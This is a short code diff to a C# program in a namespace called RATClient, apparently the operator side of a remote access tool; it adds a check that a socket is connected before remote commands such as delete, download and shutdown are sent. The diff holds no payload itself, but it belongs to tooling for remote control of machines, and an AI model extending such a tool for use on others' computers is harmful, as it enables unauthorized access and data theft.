@@ -43,6 +43,11 @@ namespace RATClient
                     case "delete":
                     case "download":
                     case "shutdown":
+                        if (sock.Connected == false) 
+                        {
+                            Console.WriteLine("Need To Be Connected To Use This Command.");
+                            break;
+                        }
                         SendCommand(CMDS);
                         break;
                     case "help":
